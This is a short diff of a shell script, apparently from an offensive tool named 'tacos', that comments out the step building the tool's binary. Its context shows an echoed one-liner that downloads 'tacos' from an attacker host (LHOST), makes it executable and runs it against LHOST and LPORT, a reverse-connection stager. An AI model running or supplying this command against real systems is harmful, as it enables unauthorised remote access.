@@ -54,8 +54,8 @@ else
 fi
 
 # put tacos in current directory
-cd ..  && make build.tacos && cd -
-mv ../tacos .
+# cd ..  && make build.tacos && cd -
+# mv ../tacos .
 
 if [[ "$GITAR" ]]; then
 	echo "curl -O ${LHOST}:9237/pull/tacos -o tacos && chmod +x tacos && ./tacos ${LHOST}:${LPORT}"
